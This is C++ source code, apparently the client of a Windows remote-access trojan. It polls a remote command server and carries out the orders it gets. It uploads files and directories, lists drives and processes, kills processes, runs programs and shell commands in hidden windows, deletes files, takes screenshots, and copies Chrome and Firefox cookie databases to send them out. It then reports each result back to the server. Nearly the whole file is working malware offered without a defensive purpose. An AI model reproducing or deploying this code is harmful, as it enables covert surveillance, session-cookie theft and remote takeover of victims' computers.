
string GetProcesses() {
	string Processes = "";
	PROCESSENTRY32 Pc;

	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (Process32First(hSnapshot, &Pc)) {
		do {
			Processes += Pc.szExeFile;
			Processes += "<br />";
		} while(Process32Next(hSnapshot, &Pc));
	}

	return Processes;
}

string GetDrives() {
	int REMOVABLE_DRIVE = 2, FIXED_DRIVE = 3;

	int dr_type = 0;
	string dr_name;
	char *temp = new char[MAX];
	string Drives;
		
	// 1st we fill the buffer
	GetLogicalDriveStrings(MAX, temp);
	
	Drives = "--Home\n";

	while(*temp != NULL) { // Split the buffer by null
		dr_type = GetDriveType(temp);
		dr_name = temp;

		if (dr_type == FIXED_DRIVE)
		{
			Drives += "*";
			Drives += dr_name.substr(0, 2);
			Drives += "|Fixed\n";
		}
		else if (dr_type == REMOVABLE_DRIVE) {
			Drives += "*";
			Drives += dr_name.substr(0, 2);
			Drives += "|Removable\n";
		}
		
		temp += strlen(temp) + 1; // increment the buffer
	}

	return Drives;
}

bool ExecuteURL(string URL) {

	HINTERNET hInternet = InternetOpen("MyAgent", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0 );
	if(hInternet == NULL) return false;

	HINTERNET hFile = InternetOpenUrl( hInternet, URL.c_str(), NULL, 0, 0, 0 );
	if(hFile == NULL) return false;
	
	InternetCloseHandle(hFile);
	InternetCloseHandle(hInternet);

	return true;
}

string UserName() {
	char buff_user[MAX]; unsigned long size = sizeof(buff_user);
	GetUserName(buff_user, &size);
	return string(buff_user);
}

string ComputerName() {
	char buff_comp[MAX]; unsigned long size = sizeof(buff_comp);
	GetComputerName(buff_comp, &size);
	return string(buff_comp);
}

string GetUniqueID() {
	return (ComputerName() + "-" + UserName()); 
}

string GetDate() {
	time_t rawtime = time(NULL);
	return string(ctime(&rawtime));
}


/* ------------------------------------------------------------------------ */

bool BrowseDirectory (ofstream &bFile, string sPath, string ext, bool recursive)
{
    WIN32_FIND_DATA FindFileData;
    string sTmpPath = sPath;
    sTmpPath += "\\*.*";

	bool DirPathShown = false;

	if (recursive == false) {
		bFile << "--" << sPath << endl;
	}

    HANDLE hFind;
	hFind = FindFirstFile( sTmpPath.c_str(), &FindFileData );

    if ( hFind == INVALID_HANDLE_VALUE ) {
		bFile << "[Error]" << endl;
        return false;
	}
    else
	{
        do
		{
            if ( !( FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY ) ) {
				string fName = FindFileData.cFileName;
				string extension = fName.substr(fName.find_last_of(".") + 1);
				
				if (ext != "*") {
					if (toLowerCase(extension) == toLowerCase(ext)) {
						if (recursive == true) {
							/* -- C:\Data\Songs\Videos\*.mp3 */
							if (DirPathShown == false) {
								bFile << endl << "-- " << sPath << "\\*." << ext << endl << endl;
								DirPathShown = true;
							}
							bFile << "\t" << FindFileData.cFileName << endl;

						} else {
							bFile << FindFileData.cFileName << "|" << getFileSize(sPath + "\\" + FindFileData.cFileName) << endl;
						}
					}
				}
				else {
					if (recursive == true) {
						if (DirPathShown == false) {
							bFile << endl << "-- " << sPath << "\\*." << ext << endl << endl;
							DirPathShown = true;
						}
						bFile << "\t" << FindFileData.cFileName << endl;

					} else {
						bFile << FindFileData.cFileName << "|" << getFileSize(sPath + "\\" + FindFileData.cFileName) << endl;
					}
				}
            }
        } while ( FindNextFile( hFind, &FindFileData) != 0 );

        FindClose( hFind );
    }

	// Now traverse the directories
	hFind = FindFirstFile( sTmpPath.c_str(), &FindFileData );

    if ( hFind == INVALID_HANDLE_VALUE ) {
        return false;
	}
    else
	{
        do
		{
            if ( ( FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY ) )
			{
				// if directory:
                if ( strcmp(".", FindFileData.cFileName ) && strcmp("..", FindFileData.cFileName) ) {
					sTmpPath = sPath;
                    sTmpPath += "\\";
					sTmpPath += FindFileData.cFileName;

					if (recursive == true) {
						BrowseDirectory(bFile, sTmpPath, ext);
					} else {
						bFile << "-" << FindFileData.cFileName << endl;
					}
                }
			}
        } while ( FindNextFile( hFind, &FindFileData) != 0 );

        FindClose( hFind );
    }

    return true;
}

void FindFile(string sPath, string sFile, vector<string> &results)
{
    string sFindPath = sPath;
    sFindPath += "\\*.*";

    WIN32_FIND_DATA FindFileData;
    HANDLE hFind = FindFirstFile(sFindPath.c_str(), &FindFileData);

    if (hFind) {

        do {
            if (FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
				if ( strcmp(".", FindFileData.cFileName ) && strcmp("..", FindFileData.cFileName) ) {
					sFindPath = sPath;
					sFindPath += "\\";
					sFindPath += FindFileData.cFileName;
					FindFile(sFindPath, sFile, results);
				}
            }
			else {
				if (strcmp(FindFileData.cFileName, sFile.c_str()) == 0) {
					results.push_back(sPath);
				}
			}
        } while( FindNextFile(hFind, &FindFileData) );
        
		FindClose(hFind);
    }

}

void UploadDir(string sPath)
{
    WIN32_FIND_DATA FindFileData;
    string sTmpPath = sPath;
    sTmpPath += "\\*.*";
	
	HANDLE hFind = FindFirstFile( sTmpPath.c_str(), &FindFileData );

    if ( hFind == INVALID_HANDLE_VALUE ) { return; }
    else {
        do
		{
            if ( !( FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY ) ) {
				sTmpPath = sPath;
                sTmpPath += "\\";
				sTmpPath += FindFileData.cFileName;
				UploadFile(sTmpPath);
			}
        } while ( FindNextFile( hFind, &FindFileData) != 0 );

        FindClose( hFind );
    }

    return;
}

/* ------------------------------------------------------------------------ */

void DOSCommand(string cmd) {
	string TEMP = getenv("TEMP");
	string TEMP_PATH = TEMP + "\\!Batch " + ID + ".bat";

	/* Create a batch file. */
	ofstream file(TEMP_PATH.c_str());
	file << cmd << endl;
	file.close();

	ShellExecute(NULL, "open", TEMP_PATH.c_str(), NULL, NULL, SW_HIDE);
}

string getCookiePath(string browser) {
	vector<string> findPath;
	string TEMP = getenv("TEMP");
	string USER_PATH = getenv("USERPROFILE");

	if (browser == "chrome") {
		FindFile(USER_PATH, "Cookies", findPath);
		string path;

		if (findPath.size()) {
			for (int i=0; i < findPath.size(); i++) {
				path = findPath[i];
				string directory = path.substr(path.find_last_of("\\") + 1);
				if (directory == "Default") {
					path += "\\Cookies";
					return path;
				}
			}
		}
	}
	else if (browser == "mozilla") {
		FindFile(USER_PATH, "cookies.sqlite", findPath);
		string path;
		
		if (findPath.size()) {
			path = findPath[0] + "\\cookies.sqlite";
			return path;
		}
	}

	return "";
}

string GetCommand(string ID) {
	string URL = DOMAINX + "command.php?client=" + urlencode(ID);
	string contents = strTrim(DownloadFile(URL.c_str()));
	return contents;
}

bool ParseCommand(string str, string &command_id, string &command, vector<string> &params) {

	params.clear();
	command = "";
	command_id = "";
	str = strTrim(str);

	int pos = str.find_first_of("##");

	command_id = strTrim(str.substr(0, pos));
	str = strTrim(str.substr(pos + 2));

	pos = str.find_first_of("##");

	if (pos != string::npos) {

		command = strTrim(str.substr(0, pos));
		string strParams = strTrim(str.substr(pos + 2));
	
		if (strParams.empty()) return false;	/* Occurs when e.g "command ##" is passed */

		if (strParams.find_first_of("|") != string::npos) {
			/* If multiple parameters */
			params = split(strParams, '|');
		}
		else {
			/* If only one parameter */
			params.push_back(strParams);
		}
	}
	else {
		command = str;	/* If no ## is found */
	}

	return true;	
}

DWORD WINAPI ExecuteCommand(LPVOID param) { 
	
	string str = (char *)param;
	string command_id; string command; vector<string> params;
	string source, destination;
	string TEMP = getenv("TEMP");

	bool result = false;

	if (ParseCommand(str, command_id, command, params)) {
	
		command = toLowerCase(command);

		if (command == "download") {
			if (params.size() == 2) {
				source = params[0];
				destination = params[1];
				string data = DownloadFile(source.c_str(), destination.c_str());
				if (data == "Success") result = true;
			}
		}
		else if (command == "upload") {
			if (params.size() == 1) {
				source = params[0];
				result = UploadFile(source);
			}
		}
		else if (command == "uploaddir") {
			if (params.size() == 1) {
				source = params[0];
				UploadDir(source);
				result = true;
			}
		}
		else if (command == "browse") {
			if (params.size() > 0) {
				string TEMP_PATH = TEMP + "\\!Browse " + ID + ".txt";
			
				source = params[0];
				string ext = (params.size() > 1 ? params[1] : "*");

				EnterCriticalSection(&sectionBrowse);
					// Browse the directory
					ofstream bFile;
					bFile.open(TEMP_PATH.c_str());
					BrowseDirectory(bFile, source.c_str(), ext, false);
					bFile.close();

					result = UploadFile(TEMP_PATH);
				LeaveCriticalSection(&sectionBrowse);

			}
		}
		else if (command == "browseall") {
			if (params.size() > 0) {
				string TEMP_PATH = TEMP + "\\Browse All.txt";
			
				source = params[0];
				string ext = (params.size() > 1 ? params[1] : "*");

				EnterCriticalSection(&sectionBrowseAll);
					// Browse the directory
					ofstream bFile;
					bFile.open(TEMP_PATH.c_str());
					bFile << "[" << source << "]" << endl << endl;
					BrowseDirectory(bFile, source.c_str(), ext, true);
					bFile.close();

					result = UploadFile(TEMP_PATH);
				LeaveCriticalSection(&sectionBrowseAll);

			}
		}
		else if (command == "drives") {
			string TEMP_PATH = TEMP + "\\!Browse " + ID + ".txt";

			// Write to it
			string Drives = GetDrives();
			ofstream file(TEMP_PATH.c_str());
			file << Drives;
			file.close();

			result = UploadFile(TEMP_PATH);
		}
		else if (command == "processes") {
			string TEMP_PATH = TEMP + "\\!Processes " + ID + ".txt";
			string cmd = "tasklist > \"" + TEMP_PATH + "\""; 

			string Processes = GetProcesses();
			ofstream file(TEMP_PATH.c_str());
			file << Processes;
			file.close();
			
			result = UploadFile(TEMP_PATH);
		}
		else if (command == "killprocess") {
			if (params.size() == 1) {
				string cmd = "taskkill /F /IM " + params[0];
				DOSCommand(cmd);
				result = true;
			}
		}
		else if (command == "execute") {
			if (params.size() > 0) {
				string path = params[0];
			
				if (params.size() == 1) {
					ShellExecute(NULL, "open", path.c_str(), NULL, NULL, SW_SHOWNORMAL);
				} else {
					ShellExecute(NULL, "open", path.c_str(), params[1].c_str(), NULL, SW_SHOWNORMAL);
				}
				result = true;
			}
		}
		else if (command == "execute1") {
			if (params.size() > 0) {
				string path = params[0];
			
				if (params.size() == 1) {
					ShellExecute(NULL, "open", path.c_str(), NULL, NULL, SW_HIDE);
				} else {
					ShellExecute(NULL, "open", path.c_str(), params[1].c_str(), NULL, SW_HIDE);
				}
				result = true;
			}
		}
		else if (command == "delete") {
			if (params.size() == 1) {
				string Path = params[0];
				result = DeleteFile(Path.c_str());
			}
		}
		else if (command == "cookies") {
			if (params.size() == 1) {
				string TEMP_PATH = TEMP;
				string browser = toLowerCase(params[0]);
				string path = getCookiePath(browser);

				if (!path.empty()) {
					if (browser == "chrome") TEMP_PATH += "\\Cookies.txt";
					else if (browser == "mozilla") TEMP_PATH += "\\cookies.sqlite.txt";

					if (CopyFile(path.c_str(), TEMP_PATH.c_str(), false)) {
						result = UploadFile(TEMP_PATH);
					}
				}
			}
		}
		else if (command == "screen") {
			string TEMP_PATH = TEMP + "\\Screenshot.jpg";
			ULONG quality = 100;
			if (params.size() == 1) quality = atoi(params[0].c_str());
			if (SaveScreenshot(TEMP_PATH, quality)) {
				result = UploadFile(TEMP_PATH);
			}
		}
		else if (command == "cmd") {
			if (params.size() == 1) {
				string cmd = params[0];
				DOSCommand(cmd);
				result = true;
			}
		}
		else if (command == "msg") {
			if (params.size() == 2) {
				string Title = params[0];
				string Message = params[1];
				MessageBox(NULL, Message.c_str(), Title.c_str(), MB_OK | MB_ICONINFORMATION | MB_SYSTEMMODAL);
				result = true;
			}
		}
		else if (command == "minimize") {
			const int MIN_ALL = 419;
			HWND lHwnd = FindWindow("Shell_TrayWnd", NULL);
			PostMessage(lHwnd, WM_COMMAND, MIN_ALL, 0);
			result = true;
		}
	}
	
	UploadResult(command_id, result);
	return 0;
}

void UploadResult(string command_id, bool res) {
	string result = (res == true ? "Success" : "Error");
	string URL = DOMAINX + "command.php?id=" + command_id + "&result=" + urlencode(result);
	ExecuteURL(URL);
}
